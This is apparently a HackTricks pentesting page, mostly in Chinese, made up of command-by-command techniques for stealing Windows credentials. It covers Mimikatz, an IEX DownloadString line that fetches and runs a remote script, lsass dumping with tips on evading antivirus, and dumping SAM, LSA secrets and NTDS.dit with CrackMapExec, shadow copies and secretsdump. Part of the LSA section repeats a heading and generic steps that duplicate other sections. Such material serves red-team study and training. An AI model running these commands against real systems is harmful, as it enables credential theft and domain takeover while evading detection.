# Stealing Windows Credentials

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在**[**这个页面**](credentials-mimikatz.md)**中找到 Mimikatz 可以做的其他事情。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**了解一些可能的凭证保护措施。**](credentials-protections.md) **这些保护措施可以防止 Mimikatz 提取某些凭证。**

## 使用 Meterpreter 获取凭证

使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **在受害者内部** **搜索密码和哈希值**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

由于 [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **中的 Procdump 是一个合法的 Microsoft 工具**，它不会被 Defender 检测到。\
你可以使用这个工具来**转储 lsass 进程**，**下载转储文件**并**从转储文件中本地提取凭据**。

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

从转储中提取凭证
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

这个过程可以通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一些 **AV** 可能会 **检测** 使用 **procdump.exe 来转储 lsass.exe** 为 **恶意行为**，这是因为它们在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。所以 **更隐蔽** 的方法是 **传递** lsass.exe 的 **PID** 给 procdump **而不是** 使用 **名称 lsass.exe。**

### 使用 **comsvcs.dll** 转储 lsass

在 `C:\Windows\System32` 中找到的名为 **comsvcs.dll** 的 DLL 负责在崩溃事件中 **转储进程内存**。这个 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，可以使用 `rundll32.exe` 调用。\
前两个参数无关紧要，但第三个参数分为三个部分。要转储的进程 ID 是第一个部分，转储文件的位置是第二个部分，第三个部分严格来说是 **full** 这个词。没有其他选项。\
在解析这三个部分后，DLL 会创建转储文件并将指定进程的内存转移到这个文件中。\
使用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传和执行 procdump。这个方法在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) 中有详细描述。

以下命令用于执行：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy) **来自动化这个过程。**

### **使用任务管理器转储lsass**

1. 右键点击任务栏并选择任务管理器
2. 点击更多详细信息
3. 在进程标签中搜索“Local Security Authority Process”进程
4. 右键点击“Local Security Authority Process”进程并选择“创建转储文件”。

### 使用procdump转储lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个由Microsoft签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护的进程转储工具，支持混淆内存转储并在远程工作站上传输，而无需将其写入磁盘。

**主要功能**：

1. 绕过PPL保护
2. 混淆内存转储文件以规避Defender基于签名的检测机制
3. 使用RAW和SMB上传方法上传内存转储而无需将其写入磁盘（无文件转储）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

### 转储 SAM 哈希值
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets

LSA secrets是存储在Windows注册表中的敏感数据。它们可以包含密码、服务帐户凭据和其他机密信息。通过访问这些秘密，攻击者可以获得对系统的更高权限。

#### 使用Mimikatz

Mimikatz是一个流行的工具，用于从Windows系统中提取凭据。要使用Mimikatz来转储LSA secrets，请执行以下步骤：

1. 下载并解压Mimikatz。
2. 以管理员身份运行命令提示符。
3. 导航到Mimikatz目录。
4. 运行以下命令：

    ```shell
    mimikatz.exe
    ```

5. 在Mimikatz控制台中，输入以下命令：

    ```shell
    privilege::debug
    ```

6. 然后输入：

    ```shell
    sekurlsa::secrets
    ```

这将显示存储在LSA secrets中的所有机密信息。

#### 使用Metasploit

Metasploit是另一个强大的工具，可以用来转储LSA secrets。要使用Metasploit，请执行以下步骤：

1. 启动Metasploit控制台。
2. 使用以下命令加载合适的模块：

    ```shell
    use post/windows/gather/lsa_secrets
    ```

3. 设置会话ID：

    ```shell
    set SESSION <session_id>
    ```

4. 运行模块：

    ```shell
    run
    ```

这将转储LSA secrets并将其显示在控制台中。

### 使用Procdump和Strings

Procdump是一个用于监控应用程序并生成其内存转储的工具。Strings是一个用于从二进制文件中提取可打印字符串的工具。结合使用这两个工具，可以从LSASS进程中提取凭据。

1. 下载并解压Procdump和Strings。
2. 以管理员身份运行命令提示符。
3. 使用Procdump创建LSASS进程的内存转储：

    ```shell
    procdump.exe -ma lsass.exe lsass.dmp
    ```

4. 使用Strings从转储文件中提取可打印字符串：

    ```shell
    strings.exe -accepteula -o lsass.dmp > output.txt
    ```

5. 检查output.txt文件以查找凭据。

### 使用Task Manager和Procdump

1. 打开Task Manager。
2. 找到lsass.exe进程。
3. 右键点击lsass.exe并选择“Create Dump File”。
4. 使用Procdump和Strings工具分析生成的转储文件。

### 使用Windows Credential Editor (WCE)

Windows Credential Editor (WCE)是另一个用于从Windows系统中提取凭据的工具。要使用WCE，请执行以下步骤：

1. 下载并解压WCE。
2. 以管理员身份运行命令提示符。
3. 导航到WCE目录。
4. 运行以下命令：

    ```shell
    wce.exe -w
    ```

这将显示存储在系统中的所有凭据。
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标DC中转储NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标DC中转储NTDS.dit密码历史记录
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 账户的 pwdLastSet 属性

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

这些文件应该**位于** _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM._ 但**你不能以常规方式复制它们**，因为它们受到保护。

### From Registry

窃取这些文件的最简单方法是从注册表中获取副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到你的Kali机器并**提取哈希**使用：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

你可以使用此服务复制受保护的文件。你需要是管理员。

#### 使用 vssadmin

vssadmin 二进制文件仅在 Windows Server 版本中可用
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但是你可以通过 **Powershell** 做同样的事情。这是一个**如何复制 SAM 文件**的例子（使用的硬盘是 "C:" 并且保存到 C:\users\Public），但你可以用这个方法复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

最后，你也可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** 文件被称为 **Active Directory** 的核心，包含关于用户对象、组及其成员关系的重要数据。域用户的 **密码哈希** 就存储在这个文件中。该文件是一个 **Extensible Storage Engine (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。

在这个数据库中，维护了三个主要表：

- **Data Table**: 该表负责存储关于用户和组等对象的详细信息。
- **Link Table**: 它跟踪关系，例如组成员关系。
- **SD Table**: 这里保存每个对象的 **安全描述符**，确保存储对象的安全性和访问控制。

更多信息请参见: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。因此，**部分** **NTDS.dit** 文件可能位于 **`lsass`** 内存中（你可以找到最近访问的数据，可能是因为使用 **缓存** 提高了性能）。

#### 解密 NTDS.dit 内的哈希

哈希被加密了三次：

1. 使用 **BOOTKEY** 和 **RC4** 解密密码加密密钥 (**PEK**)。
2. 使用 **PEK** 和 **RC4** 解密 **哈希**。
3. 使用 **DES** 解密 **哈希**。

**PEK** 在 **每个域控制器** 中具有 **相同的值**，但它在 **NTDS.dit** 文件中使用 **域控制器的 SYSTEM 文件的 BOOTKEY（不同域控制器之间不同）** 加密。这就是为什么要从 NTDS.dit 文件中获取凭据，**你需要 NTDS.dit 和 SYSTEM 文件** (_C:\Windows\System32\config\SYSTEM_)。

### 使用 Ntdsutil 复制 NTDS.dit

自 Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用[**卷影复制**](./#stealing-sam-and-system)技巧来复制**ntds.dit**文件。记住你还需要一份**SYSTEM文件**的副本（同样，[**从注册表中导出或使用卷影复制**](./#stealing-sam-and-system)技巧）。

### **从NTDS.dit中提取哈希**

一旦你**获得**了**NTDS.dit**和**SYSTEM**文件，你可以使用像_secretsdump.py_这样的工具来**提取哈希**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你也可以使用一个有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于**大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 来提取。

最后，你还可以使用 **metasploit 模块**：_post/windows/gather/credentials/domain\_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`

### **将 NTDS.dit 中的域对象提取到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库中。不仅提取了机密信息，还提取了整个对象及其属性，以便在已获取原始 NTDS.dit 文件时进行进一步的信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据如明文密码、kerberos 或信任密钥、NT 和 LM 密码历史记录）。除了其他信息，还提取以下数据：用户和机器账户及其哈希值、UAC 标志、最后登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组和递归成员关系、组织单位树和成员关系、受信域及信任类型、方向和属性...

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载二进制文件。你可以使用这个二进制文件从多个软件中提取凭据。
```
lazagne.exe all
```
## 从SAM和LSASS中提取凭据的其他工具

### Windows credentials Editor (WCE)

此工具可用于从内存中提取凭据。下载链接：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从SAM文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从SAM文件中提取凭证
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从这里下载：[http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) 并且**执行它**，密码将会被提取。

## 防御措施

[**在这里了解一些凭证保护措施。**](credentials-protections.md)

<details>

<summary><strong>从零到英雄学习 AWS hacking</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 HackTricks 上看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 周边**](https://peass.creator-spring.com)
* 发现[**The PEASS Family**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) **上关注我们**。
* **通过提交 PRs 到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库来分享你的 hacking 技巧**。

</details>
